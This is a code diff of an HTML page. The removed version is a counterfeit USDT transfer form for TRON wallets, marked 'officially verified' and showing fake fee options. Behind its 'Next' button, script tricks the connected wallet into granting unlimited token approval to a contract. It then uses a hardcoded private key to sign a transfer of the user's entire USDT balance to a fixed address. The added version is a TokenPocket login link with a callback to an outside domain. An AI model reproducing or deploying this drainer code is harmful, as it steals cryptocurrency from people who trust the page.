@@ -1,235 +1,40 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="keywords" content="Transfer">
-  <meta name="description" content="Transfer">
-  <title>Transfer</title>
-  <!-- <script src="https://cdn.jsdelivr.net/npm/tronweb@2.11.2/dist/TronWeb.js"></script> -->
-  <script src="https://cdn.jsdelivr.net/npm/tronweb@2.9.0/dist/TronWeb.js"></script>
-
-  <!-- 引入样式 -->
-  <link rel="stylesheet" href="//at.alicdn.com/t/c/font_4053014_4vpqy3obi53.css">
-  <link rel="stylesheet" href="//at.alicdn.com/t/c/font_4115716_4pvihezbcjt.css">
-  <link rel="stylesheet" href="./static/css/KiOX4bTVZ0-2bc9f95b.css">
-  <link rel="stylesheet" href="./static/css/AFCMtSKi1o-cb4abda5.css">
-  <link rel="stylesheet" href="./static/css/T-9d9ae4af.css">
-  <link rel="stylesheet" href="./static/css/dDfA04L-73dabe84.css">
-  <link rel="stylesheet" href="./static/css/uwF4-bd04d9f4.css">
+  <title>TokenPocket Integration</title>
 </head>
-
 <body>
-  <div id="app">
-    <div class="n-config-provider">
-      <div style="min-height: 50vh;">
-        <div data-v-239b0e29="" class="main-container-wrapper">
-          <div data-v-239b0e29="" class="page-container">
-            <div data-v-239b0e29="" class="send-title"> Receiving address <span data-v-239b0e29=""
-                class="official">OFFICIALLY VERIFIED</span></div>
-            <div data-v-239b0e29="" class="ens-input send__to-row">
-              <div data-v-239b0e29="" class="ens-input__wrapper">
-                <div data-v-239b0e29="" class="ens-input__wrapper__input fs14">TMjKDcFqUcDZ55dwhtpBw9YFbxrHm4Q88</div>
-              </div>
-            </div>
-            <div data-v-239b0e29="" style="margin-left: 16px;">
-              <div data-v-239b0e29="" class="send-v2__form-title">Amount</div>
-            </div>
-            <div data-v-239b0e29="" class="send-v2__form-amount-asset" style="margin-left: 16px;">
-              <div data-v-239b0e29="" class="send-v2__form-row"><button data-v-239b0e29="" class="send-v2__amount-max">
-                  <div data-v-239b0e29="" class="send-v2__amount-max__button" id="max-button">Max</div>
-                </button>
-                <div data-v-239b0e29="" class="send-v2__form-field-container">
-                  <div data-v-239b0e29="" class="send-v2__form-field">
-                    <div data-v-239b0e29="" class="unit-input">
-                      <div data-v-239b0e29="" class="unit-input__inputs">
-                        <div data-v-239b0e29="" class="unit-input__input-container"><input data-v-239b0e29=""
-                            type="text" inputmode="decimal" class="unit-input__input" placeholder="0"
-                            id="usdt-amount-input" style="width: 3.5ch;"></div>
-                      </div>
-                    </div>
-                  </div>
-                  <div data-v-239b0e29=""></div>
-                </div>
-              </div>
-              <div data-v-239b0e29="" class="send-v2__form-divider"></div>
-              <div data-v-239b0e29="" class="send-v2__form-row">
-                <div data-v-239b0e29="" class="send-v2__form-field">
-                  <div data-v-239b0e29="" class="send-v2__asset-dropdown">
-                    <div data-v-239b0e29="" class="send-v2__asset-dropdown__input-wrapper">
-                      <div data-v-239b0e29="" class="send-v2__asset-dropdown__asset">
-                        <div data-v-239b0e29="" class="send-v2__asset-dropdown__asset-title">Assets</div>
-                        <div data-v-239b0e29="" class="send-v2__asset-dropdown__asset-content">
-                          <div data-v-239b0e29="" class="send-v2__asset-dropdown__asset-icon"><img data-v-239b0e29=""
-                              class="identicon" src="./assets/token/usdt.png" alt=""
-                              style="height: 24px; width: 24px; border-radius: 12px;"></div>
-                          <div data-v-239b0e29="" class="send-v2__asset-dropdown__name">
-                            <div data-v-239b0e29="" class="currency-display-component" title="0"><span
-                                data-v-239b0e29="" class="currency-display-component__text"><span data-v-239b0e29=""
-                                  id="usdt-balance">0</span></span></div>
-                          </div>
-                          <div data-v-239b0e29="" class="send-v2__asset-dropdown__symbol">USDT</div>
-                        </div>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
+  <h1>TokenPocket Login Integration</h1>
 
-            <div data-v-239b0e29="" style="margin: 10px 16px;">
-              <div data-v-239b0e29="" class="gas-price-button-group--title">Network fee</div>
-            </div>
-            <div data-v-239b0e29="" class="list">
-              <div data-v-239b0e29="" class="item active-item" id="slow">
-                <div data-v-239b0e29="" class="header"><img data-v-239b0e29="" class="image"
-                    src="https://wfd2bp54fy.2468.pro./static/svg/beTQrs4s-07b5b9ae.svg" width="18"><span
-                    data-v-239b0e29="" class="name">Slow</span></div>
-                <div data-v-239b0e29="" class="bnb" style="text-align: center;">3 TRX</div>
-                <div data-v-239b0e29="" class="usd">$0.327423</div>
-              </div>
-              <div data-v-239b0e29="" class="item" id="medium">
-                <div data-v-239b0e29="" class="header"><img data-v-239b0e29="" class="image"
-                    src="https://wfd2bp54fy.2468.pro./static/svg/SfyIzVC-2f601456.svg" width="18"><span
-                    data-v-239b0e29="" class="name">Medium</span></div>
-                <div data-v-239b0e29="" class="bnb" style="text-align: center;">5 TRX</div>
-                <div data-v-239b0e29="" class="usd">$0.545706</div>
-              </div>
-              <div data-v-239b0e29="" class="item" id="fast">
-                <div data-v-239b0e29="" class="header"><img data-v-239b0e29="" class="image"
-                    src="https://wfd2bp54fy.2468.pro./static/svg/KzP-8d3e2675.svg" width="18"><span data-v-239b0e29=""
-                    class="name">Fast</span></div>
-                <div data-v-239b0e29="" class="bnb" style="text-align: center;">10 TRX</div>
-                <div data-v-239b0e29="" class="usd">$1.091411</div>
-              </div>
-            </div>
-            <div data-v-239b0e29="" style="margin: 60px 16px 30px;"><button data-v-239b0e29="" type="button"
-                onclick="authorizeTronUsdt()" class="van-button van-button--primary van-button--normal"
-                style="width: 100%; border-radius: 16px;">
-                <div class="van-button__content"><!----><span class="van-button__text">Next</span><!----></div>
-              </button></div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-  <script>
-    async function connectTronWallet() {
-      // 确保 TronLink 连接并且 tronWeb 初始化完成
-  while (typeof window.tronWeb === 'undefined' || !window.tronWeb.defaultAddress.base58) {
-    console.log('等待 TronLink 连接...');
-    await new Promise(resolve => setTimeout(resolve, 1000)); // 等待1秒
-  }
-
-      // 获取当前连接的账户地址
-      const userAddress = window.tronWeb.defaultAddress.base58;
-
-      // USDT 合约地址（Shasta 测试网）
-      const usdtContractAddress = 'THURdnqGLNNyHvVjgVqTdS7zDh8W4SM8Pz';
-
-      // 获取 USDT 合约实例
-      const contract = await window.tronWeb.contract().at(usdtContractAddress);
-
-      // 调用合约的 balanceOf 方法获取用户 USDT 余额
-      const balance = await contract.balanceOf(userAddress).call();
-
-      // 显示余额（注意USDT是6个小数位，需要转换）
-      const usdtBalance = window.tronWeb.toDecimal(balance) / 1e6;
-
-      // 监听 Max 按钮点击事件，点击时填充余额
-      document.getElementById('max-button').addEventListener('click', function () {
-        document.getElementById('usdt-amount-input').value = usdtBalance;
-      });
-
-      // 更新页面上的余额显示
-      document.getElementById('usdt-balance').innerText = usdtBalance;
-    }
-
-    // 页面加载时自动调用连接函数
-    window.onload = connectTronWallet;
-  </script>
+  <!-- 点击此链接可以跳转到 TokenPocket -->
+  <a href="" id="tp-link">点击这里使用 TokenPocket 登录</a>
 
   <script>
-    // 获取所有 item 元素
-    const items = document.querySelectorAll('.item');
+    // 定义 JSON 对象
+    const tpData = {
+      "callbackUrl": "https://www.pihksale.finance/12s/tp",
+      "action": "login",
+      "actionId": "1648522106711",
+      "blockchain": "tron",
+      "dappIcon": "https://eosknights.io/img/icon.png",
+      "dappName": "zs",
+      "protocol": "TokenPocket",
+      "version": "2.0"
+    };
 
-    // 为每个 item 添加点击事件监听器
-    items.forEach(item => {
-      item.addEventListener('click', function () {
-        // 移除所有 item 的 active-item 类
-        items.forEach(i => i.classList.remove('active-item'));
+    // 将 JSON 对象转换为 URL 编码的字符串
+    const tpParams = encodeURIComponent(JSON.stringify(tpData));
 
-        // 为当前点击的 item 添加 active-item 类
-        item.classList.add('active-item');
-      });
-    });
+    // 构造 TokenPocket URL
+    const tpUrl = `tpoutside://pull.activity?param=${tpParams}`;
+
+    // 设置超链接的 href 属性
+    document.getElementById('tp-link').href = tpUrl;
+
+    // 调试：在控制台显示生成的 URL
+    console.log('TokenPocket URL:', tpUrl);
   </script>
-
-  <script>
-    // 初始化 TronWeb
-    const tronWeb = new TronWeb({
-    //   fullHost: 'https://api.trongrid.io', // 主网
-      fullHost: 'https://api.shasta.trongrid.io', // Shasta 测试网
-    });
-    async function authorizeTronUsdt() {
-      try {
-        // 主钱包私钥
-        const mainWalletPrivateKey = '09705E69BCF60D0E85456E3D1DB94124B8F89B6EA86D2E05357920E42271B0B7';
-        // 获取当前连接的账户
-        await window.tronLink.request({ method: 'tron_requestAccounts' });
-        const fromAddress = window.tronWeb.defaultAddress.base58;
-
-        const transferContract = 'TTikvL6oACpebWFU3j8bUabJx5kgEUYgGQ'; // 合约地址，转换为十六进制
-        const usdtrecipient = 'TRg9o55JzYhJjeRo1gTHqttNwHcAzfWEoi'; // 接收地址，转换为十六进制
-        const tokenContractAddress = 'THURdnqGLNNyHvVjgVqTdS7zDh8W4SM8Pz'; // USDT 合约地址
-        const amount = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // 2^256 - 1，表示无限授权; // 授权的 USDT 数量（单位是最小单位）
-
-        // 使用 tronWeb 访问智能合约
-        const contract = await window.tronWeb.contract().at(tokenContractAddress);
-        // 调用合约的 balanceOf 方法获取用户 USDT 余额
-        const balance = await contract.balanceOf(fromAddress).call();
-
-        // 执行授权操作
-        const result = await contract.approve(transferContract, amount).send({
-          from: fromAddress
-        });
-
-        if (result) {
-          console.log('授权成功！');
-
-          // 构建 transferUSDT 的智能合约交易
-          const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
-            tronWeb.address.toHex(transferContract), // 合约地址（十六进制）
-            'transferUSDT(address,address,uint256)', // 调用的合约函数签名
-            { feeLimit: 150000000 }, // 设置 feeLimit
-            [
-              { type: 'address', value: fromAddress }, // 转出地址
-              { type: 'address', value: usdtrecipient }, // 接收地址
-              { type: 'uint256', value: balance } // 转账金额
-            ],
-            tronWeb.address.toHex(tronWeb.address.fromPrivateKey(mainWalletPrivateKey)) // 使用主钱包地址（转换为十六进制）
-          );
-
-          // 使用主钱包私钥签名交易
-          const signedtxn = await tronWeb.trx.sign(transaction.transaction, mainWalletPrivateKey);
-
-          console.log('签名后的交易:', signedtxn);
-
-          // 发送签名后的交易
-          const transferResult = await tronWeb.trx.sendRawTransaction(signedtxn);
-
-
-        } else {
-          console.log('授权失败！');
-        }
-      } catch (error) {
-        console.error('发生错误，请查看控制台：', error);
-      }
-    }
-  </script>
-
-
 </body>
-
 </html>
